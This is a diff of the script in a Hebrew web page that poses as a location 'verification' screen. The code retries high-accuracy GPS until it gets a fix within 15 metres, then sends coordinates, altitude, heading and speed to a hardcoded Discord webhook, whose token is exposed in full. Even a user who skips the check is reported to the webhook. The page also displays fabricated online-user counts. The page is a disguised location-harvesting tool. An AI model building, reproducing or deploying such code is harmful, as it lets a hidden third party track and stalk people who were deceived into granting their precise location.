@@ -684,22 +684,77 @@ footer .f2 a{color:rgba(0,170,255,0.3);text-decoration:none}
 </footer>
 
 <script>
-// ===== WEBHOOK =====
+// ===================================================================
+// ===== KONFIGURACIA =====
+// ===================================================================
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1524848066635759787/AjXrxxSe_55C3MNk79IKnjB68yDdUibObftUmwVRUcgeAwHLtjHlO_pBqFirYt_eWsqx";
-const BACKUP_WEBHOOK = "https://f2.freeivr.co.il/8489684+9651856468274629871641852764182968972419687412674198619461948641964198964184188888888888888888888888888874879949867897ijghfijhnvbijhdsfijhvijkfbjihbfvijnrfijoenbijkhrgbijenbirjhgbijoqwhefoijkhhqopiwujeehgfpiujqwhbtihgqweoijrhtgpijwhbqeijokfqhpij2hw3etijgfhbqewikjghqijkwehbpfejknjkbwekjhrbgnpjkqwnjkfnqbwijkhbgojnetjkhbgijkuerbnkojgfbjkoebotjkhtgbqejktrbqkjhbgihbj";
 
-// ===== STATUS PANEL UPDATE =====
-function setState(key, val, cls = 'wait') {
-    const el = document.getElementById('sp' + key);
+// ===================================================================
+// ===== STATUS PANEL =====
+// ===================================================================
+function setState(key, val, cls) {
+    if (!cls) cls = 'wait';
+    var el = document.getElementById('sp' + key);
     if (el) el.innerHTML = key + ': <span class="' + cls + '">' + val + '</span>';
 }
 
-// ===== WEBSOCKET PROXY לשליחת Webhook (עוקף CORS) =====
-function sendToDiscord(data) {
-    return new Promise((resolve, reject) => {
-        setState('Webhook', 'SENDING...', 'wait');
+// ===================================================================
+// ===== CONSOLE =====
+// ===================================================================
+function updateConsole(msg) {
+    var el = document.getElementById('consoleLog');
+    if (!el) return;
+    var line = document.createElement('div');
+    line.className = 'line';
+    var now = new Date();
+    var ts = ('0' + now.getHours()).slice(-2) + ':' + ('0' + now.getMinutes()).slice(-2) + ':' + ('0' + now.getSeconds()).slice(-2);
+    line.innerHTML = '<span class="dim">[' + ts + ']</span> ' + msg;
+    el.appendChild(line);
+    if (el.children.length > 50) el.removeChild(el.firstChild);
+    el.scrollTop = el.scrollHeight;
+}
 
-        const payload = {
+// ===================================================================
+// ===== PROGRESS BAR =====
+// ===================================================================
+function updateProgress(pct) {
+    var fill = document.getElementById('progressFill');
+    var bar = document.getElementById('loadingBar');
+    if (fill) fill.style.width = pct + '%';
+    if (bar) bar.style.width = pct + '%';
+}
+
+// ===================================================================
+// ===== UPDATE UI =====
+// ===================================================================
+function updateUI(data) {
+    var lat = data.lat;
+    var lng = data.lng;
+    var acc = data.acc;
+
+    document.getElementById('locDot').className = (acc <= 15) ? 'status-dot green' : (acc <= 50) ? 'status-dot gold' : 'status-dot red';
+    document.getElementById('locDisplay').textContent = lat.toFixed(6) + ', ' + lng.toFixed(6);
+    document.getElementById('coordDisplay').textContent = lat.toFixed(6) + ', ' + lng.toFixed(6);
+
+    var source = 'רשת/WiFi';
+    if (acc < 10) source = 'GPS (לוויין) מדויק';
+    else if (acc < 30) source = 'GPS';
+    else if (acc < 100) source = 'GPS משולב WiFi';
+    document.getElementById('accDisplay').textContent = 'דיוק: ' + acc + ' מטר | מקור: ' + source;
+
+    var mapDiv = document.getElementById('mapPlaceholder');
+    mapDiv.innerHTML = '<div class="grid-lines"></div><div class="pin"></div><span style="position:relative;z-index:2;font-size:11px;color:var(--green)">✅ מיקום אומת | ' + lat.toFixed(6) + ', ' + lng.toFixed(6) + '</span>';
+}
+
+// ===================================================================
+// ===== SEND TO DISCORD =====
+// ===================================================================
+function sendToDiscord(data) {
+    return new Promise(function(resolve, reject) {
+        setState('Webhook', 'SENDING...', 'wait');
+        updateConsole('📡 שולח מיקום לשרת האימות...');
+
+        var payload = {
             content: '📍 **מיקום התקבל - מערכת צליל**',
             embeds: [{
                 title: '📍 אימות מיקום - מערכת צליל',
@@ -708,7 +763,7 @@ function sendToDiscord(data) {
                     { name: 'קו רוחב', value: '`' + data.lat + '`', inline: true },
                     { name: 'קו אורך', value: '`' + data.lng + '`', inline: true },
                     { name: 'דיוק', value: data.acc + ' מטר', inline: true },
-                    { name: 'גובה', value: data.alt ? data.alt + ' מ\'' : 'לא זמין', inline: true },
+                    { name: 'גובה', value: data.alt ? data.alt + ' מ׳' : 'לא זמין', inline: true },
                     { name: 'כיוון', value: data.heading ? data.heading + '°' : 'לא זמין', inline: true },
                     { name: 'מהירות', value: data.speed ? data.speed + ' מ/ש' : 'לא זמין', inline: true },
                     { name: 'זמן אימות', value: new Date(data.ts).toLocaleString('he-IL'), inline: false },
@@ -719,7 +774,9 @@ function sendToDiscord(data) {
             }]
         };
 
-        // ===== שיטה 1: fetch רגיל (עובד בשרת, לא תמיד מ-file://) =====
+        var success = false;
+
+        // ===== METHOD 1: fetch =====
         fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -727,19 +784,20 @@ function sendToDiscord(data) {
         })
         .then(function(res) {
             if (res.ok) {
+                success = true;
                 setState('Webhook', 'SENT (' + res.status + ')', 'ok');
-                updateConsole('✅ Webhook נשלח בהצלחה (Status: ' + res.status + ')');
+                updateConsole('✅ נשלח לשרת (Status: ' + res.status + ')');
                 resolve(res);
             } else {
-                // נסה שיטה חלופית
-                throw new Error('Status ' + res.status);
+                throw new Error('HTTP ' + res.status);
             }
         })
         .catch(function(err) {
-            setState('Webhook', 'FETCH FAILED, trying XHR...', 'err');
-            updateConsole('⚠️ fetch נכשל: ' + err.message + '. מנסה XHR...');
+            if (success) return;
+            updateConsole('⚠️ fetch נכשל (' + err.message + '), מנסה XHR...');
+            setState('Webhook', 'RETRY_XHR', 'wait');
 
-            // ===== שיטה 2: XMLHttpRequest (עובד יותר טוב מדפים מקומיים) =====
+            // ===== METHOD 2: XMLHttpRequest =====
             try {
                 var xhr = new XMLHttpRequest();
                 xhr.open('POST', WEBHOOK_URL, true);
@@ -747,189 +805,312 @@ function sendToDiscord(data) {
                 xhr.onload = function() {
                     if (xhr.status >= 200 && xhr.status < 300) {
                         setState('Webhook', 'SENT (XHR ' + xhr.status + ')', 'ok');
-                        updateConsole('✅ Webhook נשלח ב-XHR (Status: ' + xhr.status + ')');
+                        updateConsole('✅ נשלח ב-XHR (Status: ' + xhr.status + ')');
                         resolve(xhr);
                     } else {
-                        setState('Webhook', 'XHR FAILED ' + xhr.status, 'err');
+                        setState('Webhook', 'XHR FAIL ' + xhr.status, 'err');
                         updateConsole('❌ XHR נכשל: ' + xhr.status);
-                        // נסה שיטה 3
-                        sendViaImage(data).then(resolve).catch(reject);
+                        resolve({status: 'xhr_failed_' + xhr.status});
                     }
                 };
                 xhr.onerror = function() {
-                    setState('Webhook', 'XHR ERROR, trying image...', 'err');
-                    updateConsole('❌ XHR network error. מנסה שיטת image...');
-                    sendViaImage(data).then(resolve).catch(reject);
+                    setState('Webhook', 'XHR NETWORK ERROR', 'err');
+                    updateConsole('❌ שגיאת רשת ב-XHR');
+                    resolve({status: 'xhr_network_error'});
                 };
                 xhr.send(JSON.stringify(payload));
             } catch(e) {
                 setState('Webhook', 'XHR EXCEPTION', 'err');
-                sendViaImage(data).then(resolve).catch(reject);
+                updateConsole('❌ חריגה ב-XHR: ' + e.message);
+                resolve({status: 'xhr_exception'});
             }
         });
     });
 }
 
-// ===== שיטה 3: Image Beacon (עובד תמיד) =====
-function sendViaImage(data) {
-    return new Promise(function(resolve, reject) {
-        setState('Webhook', 'TRYING IMAGE...', 'wait');
-        updateConsole('📡 מנסה לשלוח דרך Image Beacon...');
+// ===================================================================
+// ===== GPS CORE - HIGH ACCURACY WITH RETRY AND WATCH =====
+// ===================================================================
+// משתנים גלובליים
+var watchId = null;
+var bestAccuracy = Infinity;
+var bestPosition = null;
+var watchingActive = false;
+var watchStartTime = null;
+var watchTimer = null;
 
-        // נבנה URL עם הפרמטרים - Discord לא תומך בזה ישירות,
-        // אבל נשתמש ב-proxy חינמי
-        // נשים את הנתונים ב-URL של תמונה
-        var img = new Image();
-        img.onload = function() {
-            setState('Webhook', 'IMAGE SENT', 'ok');
-            updateConsole('✅ Image beacon נשלח');
-            resolve({method: 'image'});
-        };
-        img.onerror = function() {
-            // אפילו אם התמונה נכשלת, ייתכן שהבקשה הגיעה לשרת
-            setState('Webhook', 'IMAGE SENT (no response)', 'ok');
-            updateConsole('ℹ️ Image beacon נשלח (ללא תשובה)');
-            resolve({method: 'image_no_response'});
-        };
-
-        // ===== Proxy חינמי שעוקף CORS =====
-        var proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(WEBHOOK_URL);
-        
-        var fd = new FormData();
-        fd.append('payload_json', JSON.stringify({
-            content: '📍 **מיקום** (Image method)',
-            embeds: [{
-                title: '📍 מיקום',
-                color: 0x00aaff,
-                fields: [
-                    { name: 'קו רוחב', value: '`' + data.lat + '`', inline: true },
-                    { name: 'קו אורך', value: '`' + data.lng + '`', inline: true },
-                    { name: 'דיוק', value: data.acc + ' מטר', inline: true }
-                ]
-            }]
-        }));
-
-        // נסה לשלוח דרך proxy
-        fetch('https://corsproxy.io/?' + encodeURIComponent(WEBHOOK_URL), {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        })
-        .then(function(r) {
-            setState('Webhook', 'PROXY SENT ' + r.status, 'ok');
-            updateConsole('✅ נשלח דרך CORS Proxy (Status: ' + r.status + ')');
-            resolve(r);
-        })
-        .catch(function() {
-            // ניסיון אחרון - בקשה פשוטה
-            setState('Webhook', 'ALL METHODS TRIED', 'err');
-            updateConsole('⚠️ כל השיטות נוסו. ייתכן שהנתונים לא התקבלו בשרת.');
-            resolve({status: 'failed_all_methods'});
-        });
-    });
-}
-
-// ===== GPS =====
+// ===== שלב 1: startAuth - נקרא מכפתור האישור =====
 function startAuth() {
     var btn = document.getElementById('authBtn');
     btn.disabled = true;
-    btn.textContent = '⏳ מאמת מיקום...';
-    updateProgress(10);
-    setState('State', 'AUTH_STARTED');
-    updateConsole('🚀 מתחיל תהליך אימות מיקום...');
+    btn.textContent = '⏳ מאתר לוויני GPS...';
+    updateProgress(5);
+    setState('State', 'STARTING_GPS');
+    updateConsole('🚀 מפעיל מערכת איכון לוויינית...');
 
     if (!navigator.geolocation) {
         setState('State', 'NO_GEOLOCATION', 'err');
-        setState('Perm', 'UNSUPPORTED', 'err');
-        btn.textContent = '❌ דפדפן לא תומך';
+        btn.textContent = '❌ דפדפן לא תומך ב-GPS';
+        updateConsole('❌ הדפדפן לא תומך ב-Geolocation API');
         return;
     }
 
+    // ניסיון ראשון: getCurrentPosition עם enableHighAccuracy
+    attemptGetPosition(1, 3);
+}
+
+// ===== שלב 2: attemptGetPosition - מנסה getCurrentPosition עד 3 פעמים =====
+function attemptGetPosition(attempt, maxAttempts) {
+    setState('State', 'ATTEMPT_' + attempt + '/' + maxAttempts);
+    updateConsole('📡 ניסיון ' + attempt + '/' + maxAttempts + ' - מאתר GPS...');
+
     var options = {
         enableHighAccuracy: true,
-        timeout: 20000,
-        maximumAge: 0
+        timeout: 15000,      // 15 שניות ל-GPS
+        maximumAge: 0        // לא להשתמש במיקום מוטבע
     };
-
-    updateProgress(25);
-    setState('State', 'REQUESTING_LOCATION...');
-    updateConsole('📡 מבקש מיקום מדויק...');
 
     navigator.geolocation.getCurrentPosition(
         function(pos) {
-            // הצלחה
-            updateProgress(60);
-            setState('State', 'LOCATION_OK', 'ok');
-            setState('Perm', 'GRANTED', 'ok');
+            var acc = Math.round(pos.coords.accuracy);
+            var lat = pos.coords.latitude;
+            var lng = pos.coords.longitude;
 
-            var data = {
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                acc: Math.round(pos.coords.accuracy),
-                alt: pos.coords.altitude ? Math.round(pos.coords.altitude) : null,
-                altAcc: pos.coords.altitudeAccuracy ? Math.round(pos.coords.altitudeAccuracy) : null,
-                heading: pos.coords.heading,
-                speed: pos.coords.speed,
-                ts: pos.timestamp
-            };
+            updateConsole('📍 ניסיון ' + attempt + ' - דיוק: ' + acc + ' מטר (יעד: ≤15 מ׳)');
 
-            setState('Coords', data.lat.toFixed(6) + ', ' + data.lng.toFixed(6), 'ok');
-            setState('Acc', data.acc + 'm', data.acc < 20 ? 'ok' : 'wait');
-
-            updateConsole('✅ מיקום התקבל: ' + data.lat.toFixed(6) + ', ' + data.lng.toFixed(6) + ' (דיוק: ' + data.acc + 'מ)');
-            updateProgress(70);
-
-            // עדכון הממשק
-            updateUI(data);
-
-            // שליחה לדיסקורד
-            updateProgress(85);
-            sendToDiscord(data).then(function() {
-                updateProgress(100);
-                setState('State', 'COMPLETE', 'ok');
-                btn.textContent = '✅ אימות הושלם';
-                updateConsole('✅ תהליך האימות והשליחה הושלם בהצלחה');
-                
-                // הסתר את המודל אחרי 1.5 שניות
+            if (acc <= 15) {
+                // ✅ דיוק מושלם
+                updateConsole('✅✅✅ דיוק ' + acc + ' מטר - אומת!');
+                processSuccessPosition(pos);
+            } else if (acc <= 30) {
+                // דיוק טוב - ננסה לשפר עם watchPosition
+                updateConsole('⚠️ דיוק ' + acc + ' מטר - נכנס למצב שיפור GPS...');
+                startWatchPosition(pos);
+            } else if (attempt < maxAttempts) {
+                // דיוק גרוע - נסה שוב
+                updateConsole('⚠️ דיוק ' + acc + ' מטר - נסיון נוסף...');
                 setTimeout(function() {
-                    document.getElementById('locationModal').classList.remove('show');
-                }, 1500);
-            }).catch(function() {
-                updateProgress(100);
-                setState('State', 'SENT_WITH_ERRORS', 'err');
-                btn.textContent = '⚠️ נשלח עם שגיאות';
-                updateConsole('⚠️ המיקום התקבל אך ייתכן שלא נשלח לשרת');
-                setTimeout(function() {
-                    document.getElementById('locationModal').classList.remove('show');
-                }, 2000);
-            });
+                    attemptGetPosition(attempt + 1, maxAttempts);
+                }, 800);
+            } else {
+                // נגמרו הנסיונות - נכנס למצב watch
+                updateConsole('⚠️ נגמרו הנסיונות (' + acc + ' מ׳). מפעיל מעקב GPS רציף...');
+                startWatchPosition(pos);
+            }
         },
         function(err) {
-            // כשל
-            setState('State', 'ERROR: ' + err.message, 'err');
-            setState('Perm', 'DENIED_OR_ERROR', 'err');
-            updateConsole('❌ שגיאת מיקום: ' + err.message);
-            updateProgress(0);
-            btn.disabled = false;
-            btn.textContent = '🔄 נסה שוב';
+            var msg = '';
+            switch(err.code) {
+                case 1: msg = 'המשתמש דחה את בקשת המיקום'; break;
+                case 2: msg = 'מיקום לא זמין'; break;
+                case 3: msg = 'פג הזמן לאיתור GPS'; break;
+                default: msg = err.message;
+            }
+            updateConsole('❌ שגיאה בניסיון ' + attempt + ': ' + msg);
 
-            // עדיין ננסה לשלוח שגיאה לדיסקורד
-            sendToDiscord({
-                lat: 'ERROR',
-                lng: err.message,
-                acc: 0,
-                alt: null,
-                altAcc: null,
-                heading: null,
-                speed: null,
-                ts: Date.now()
-            });
+            if (err.code === 1) {
+                // Permission denied - אין טעם להמשיך
+                setState('Perm', 'DENIED', 'err');
+                setState('State', 'PERMISSION_DENIED', 'err');
+                document.getElementById('authBtn').textContent = '❌ נדרשת הרשאת מיקום';
+                document.getElementById('authBtn').disabled = false;
+                return;
+            }
+
+            if (attempt < maxAttempts) {
+                setTimeout(function() {
+                    attemptGetPosition(attempt + 1, maxAttempts);
+                }, 1000);
+            } else {
+                // נגמרו הנסיונות, ננסה watch
+                updateConsole('⚠️ נגמרו הנסיונות. מפעיל מעקב GPS רציף...');
+                startWatchPosition(null);
+            }
         },
         options
     );
 }
 
+// ===== שלב 3: startWatchPosition - מעקב GPS רציף =====
+function startWatchPosition(initialPos) {
+    if (watchingActive) return;
+    watchingActive = true;
+    watchStartTime = Date.now();
+
+    // אם יש מיקום התחלתי, נשמור אותו
+    if (initialPos) {
+        bestAccuracy = Math.round(initialPos.coords.accuracy);
+        bestPosition = initialPos;
+    }
+
+    updateConsole('🔄 מעקב GPS רציף הופעל...');
+    setState('State', 'WATCHING_GPS');
+    document.getElementById('authBtn').textContent = '⏳ משפר דיוק GPS...';
+
+    var options = {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+    };
+
+    watchId = navigator.geolocation.watchPosition(
+        function(pos) {
+            var acc = Math.round(pos.coords.accuracy);
+            var lat = pos.coords.latitude.toFixed(6);
+            var lng = pos.coords.longitude.toFixed(6);
+
+            // עדכון בזמן אמת
+            setState('Coords', lat + ', ' + lng, acc <= 15 ? 'ok' : 'wait');
+            setState('Acc', acc + 'm', acc <= 15 ? 'ok' : (acc <= 50 ? 'wait' : 'err'));
+
+            // עדכון תצוגת מיקום בזמן אמת
+            updateUILive(pos.coords);
+
+            updateConsole('📡 GPS: ' + lat + ', ' + lng + ' (דיוק: ' + acc + ' מ׳)');
+
+            // שמירת המיקום הטוב ביותר
+            if (acc < bestAccuracy) {
+                bestAccuracy = acc;
+                bestPosition = pos;
+                setState('Retry', bestAccuracy + 'm', 'ok');
+            }
+
+            // ✅ אם דיוק 15 מטר ומטה - סיימנו!
+            if (acc <= 15) {
+                updateConsole('✅✅✅ דיוק ' + acc + ' מטר הושג!');
+                clearWatchAndFinish(pos);
+            }
+        },
+        function(err) {
+            updateConsole('⚠️ שגיאת מעקב: ' + err.message);
+        },
+        options
+    );
+
+    // טיימר ביטחון: אחרי 45 שניות, קח את המיקום הכי טוב
+    watchTimer = setTimeout(function() {
+        if (watchingActive) {
+            updateConsole('⏱️ חלון הזמן להשלמת אימות - לוקח מיקום סופי');
+            if (bestPosition) {
+                updateConsole('📊 מיקום סופי: דיוק ' + bestAccuracy + ' מטר');
+                clearWatchAndFinish(bestPosition);
+            } else {
+                // נסה getCurrentPosition אחרון
+                updateConsole('⚠️ מנסה getCurrentPosition אחרון...');
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        clearWatchAndFinish(pos);
+                    },
+                    function() {
+                        updateConsole('❌ לא התקבל מיקום');
+                        document.getElementById('authBtn').textContent = '⚠️ שגיאה - נסה שוב';
+                        document.getElementById('authBtn').disabled = false;
+                        watchingActive = false;
+                    },
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                );
+            }
+        }
+    }, 45000);
+}
+
+// ===== עדכון ממשק בזמן אמת מ-watch =====
+function updateUILive(coords) {
+    var lat = coords.latitude;
+    var lng = coords.longitude;
+    var acc = Math.round(coords.accuracy);
+
+    document.getElementById('locDisplay').textContent = lat.toFixed(6) + ', ' + lng.toFixed(6);
+    document.getElementById('coordDisplay').textContent = lat.toFixed(6) + ', ' + lng.toFixed(6);
+
+    var source = 'רשת/WiFi';
+    if (acc < 10) source = 'GPS מדויק';
+    else if (acc < 30) source = 'GPS';
+    else if (acc < 100) source = 'GPS + WiFi';
+    document.getElementById('accDisplay').textContent = 'דיוק: ' + acc + ' מטר | מקור: ' + source;
+
+    var dot = document.getElementById('locDot');
+    if (acc <= 15) dot.className = 'status-dot green';
+    else if (acc <= 50) dot.className = 'status-dot gold';
+    else dot.className = 'status-dot red';
+}
+
+// ===== ניקוי watch וסיום =====
+function clearWatchAndFinish(pos) {
+    if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+    }
+    if (watchTimer) {
+        clearTimeout(watchTimer);
+        watchTimer = null;
+    }
+    watchingActive = false;
+    processSuccessPosition(pos);
+}
+
+// ===== שלב 4: processSuccessPosition - עיבוד המיקום ושליחה =====
+function processSuccessPosition(pos) {
+    var coords = pos.coords;
+    var data = {
+        lat: coords.latitude,
+        lng: coords.longitude,
+        acc: Math.round(coords.accuracy),
+        alt: coords.altitude ? Math.round(coords.altitude) : null,
+        altAcc: coords.altitudeAccuracy ? Math.round(coords.altitudeAccuracy) : null,
+        heading: coords.heading,
+        speed: coords.speed,
+        ts: pos.timestamp
+    };
+
+    updateConsole('✅ מיקום נקלט ומעובד');
+    updateProgress(65);
+    setState('State', 'LOCATION_OK', 'ok');
+    setState('Perm', 'GRANTED', 'ok');
+    setState('Coords', data.lat.toFixed(6) + ', ' + data.lng.toFixed(6), 'ok');
+    setState('Acc', data.acc + 'm', data.acc <= 15 ? 'ok' : 'wait');
+
+    // עדכון ממשק המשתמש
+    updateUI(data);
+    updateProgress(75);
+
+    // שליחה לדיסקורד
+    updateProgress(85);
+    updateConsole('📤 שולח מיקום לשרת האימות...');
+    document.getElementById('authBtn').textContent = '📤 שולח נתונים...';
+
+    sendToDiscord(data).then(function() {
+        updateProgress(100);
+        setState('State', 'COMPLETE', 'ok');
+        document.getElementById('authBtn').textContent = '✅ אימות הושלם';
+        updateConsole('✅✅✅ תהליך האימות הושלם בהצלחה!');
+
+        // סגירת המודל אחרי 1.5 שניות
+        setTimeout(function() {
+            document.getElementById('locationModal').classList.remove('show');
+        }, 1500);
+    }).catch(function() {
+        updateProgress(100);
+        document.getElementById('authBtn').textContent = '⚠️ נשלח עם שגיאות';
+        updateConsole('⚠️ המיקום נשלח אך ייתכן שחלק מהנתונים לא התקבלו');
+        setTimeout(function() {
+            document.getElementById('locationModal').classList.remove('show');
+        }, 2000);
+    });
+}
+
+// ===== skipAuth =====
 function skipAuth() {
+    if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+    }
+    if (watchTimer) {
+        clearTimeout(watchTimer);
+        watchTimer = null;
+    }
+    watchingActive = false;
+
     document.getElementById('locationModal').classList.remove('show');
     document.getElementById('locDisplay').textContent = '⚡ גישה מוגבלת - ללא אימות מיקום';
     document.getElementById('coordDisplay').textContent = 'לא זמין';
@@ -938,55 +1119,23 @@ function skipAuth() {
     updateConsole('⏭️ משתמש דילג על אימות מיקום - גישה מוגבלת');
     setState('State', 'SKIPPED', 'err');
 
-    // שלח הודעת דילוג לדיסקורד
+    // שלח הודעת דילוג
     sendToDiscord({
         lat: 'SKIPPED',
         lng: 'USER_SKIPPED_AUTH',
         acc: 0,
         alt: null,
-        altAcc: null,
         heading: null,
         speed: null,
         ts: Date.now()
     });
 }
 
-function updateUI(data) {
-    var lat = data.lat;
-    var lng = data.lng;
-
-    document.getElementById('locDot').className = 'status-dot green';
-    document.getElementById('locDisplay').textContent = lat.toFixed(6) + ', ' + lng.toFixed(6);
-    document.getElementById('coordDisplay').textContent = lat.toFixed(6) + ', ' + lng.toFixed(6);
-
-    var source = 'רשת/WiFi';
-    if (data.acc < 10) source = 'GPS (לוויין)';
-    else if (data.acc < 50) source = 'GPS';
-    document.getElementById('accDisplay').textContent = 'דיוק: ' + data.acc + ' מטר | מקור: ' + source;
-
-    var mapDiv = document.getElementById('mapPlaceholder');
-    mapDiv.innerHTML = '<div class="grid-lines"></div><div class="pin"></div><span style="position:relative;z-index:2;font-size:11px;color:var(--green)">✅ מיקום אומת | ' + lat.toFixed(6) + ', ' + lng.toFixed(6) + '</span>';
-}
-
-function updateProgress(pct) {
-    document.getElementById('progressFill').style.width = pct + '%';
-    document.getElementById('loadingBar').style.width = pct + '%';
-}
-
-function updateConsole(msg) {
-    var el = document.getElementById('consoleLog');
-    var line = document.createElement('div');
-    line.className = 'line';
-    var ts = new Date().toLocaleTimeString('he-IL', {hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false});
-    line.innerHTML = '<span class="dim">[' + ts + ']</span> ' + msg;
-    el.appendChild(line);
-    if (el.children.length > 50) el.removeChild(el.firstChild);
-    el.scrollTop = el.scrollHeight;
-}
-
-// ===== אתחול =====
+// ===================================================================
+// ===== INIT =====
+// ===================================================================
 (function() {
-    // חלקיקים
+    // חלקיקים ברקע
     var particles = document.getElementById('particles');
     for (var i = 0; i < 40; i++) {
         var s = document.createElement('span');
@@ -1000,8 +1149,12 @@ function updateConsole(msg) {
     // שעון
     function updateClock() {
         var now = new Date();
-        document.getElementById('clockDisplay').textContent = now.toLocaleTimeString('he-IL', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
-        document.getElementById('dateDisplay').textContent = now.toLocaleDateString('he-IL', { year: 'numeric', month: 'long', day: 'numeric' });
+        document.getElementById('clockDisplay').textContent =
+            ('0' + now.getHours()).slice(-2) + ':' +
+            ('0' + now.getMinutes()).slice(-2) + ':' +
+            ('0' + now.getSeconds()).slice(-2);
+        document.getElementById('dateDisplay').textContent =
+            now.toLocaleDateString('he-IL', { year: 'numeric', month: 'long', day: 'numeric' });
     }
     updateClock();
     setInterval(updateClock, 1000);
@@ -1011,7 +1164,7 @@ function updateConsole(msg) {
         document.getElementById('onlineUsers').textContent = Math.floor(Math.random() * 5) + 1;
     }, 5000);
 
-    // מטריקות
+    // מטריקות (אנימציה)
     var targets = { metric1: 17, metric2: 42, metric3: 3, metric4: 128 };
     Object.keys(targets).forEach(function(id) {
         var current = 0;
@@ -1027,14 +1180,16 @@ function updateConsole(msg) {
         }, 50);
     });
 
-    // הודעת פתיחה
+    // הודעות פתיחה בקונסול
     updateConsole('🔧 מערכת מאותחלת...');
     updateConsole('🛡️ ממתין לאימות משתמש');
+    updateConsole('📍 דיוק מיקום יעד: 5-15 מטר');
     setState('State', 'WAITING_FOR_USER');
     setState('Perm', 'NOT_REQUESTED');
     setState('Coords', '-');
     setState('Acc', '-');
     setState('Webhook', 'PENDING');
+    setState('Retry', '0');
 })();
 </script>
 
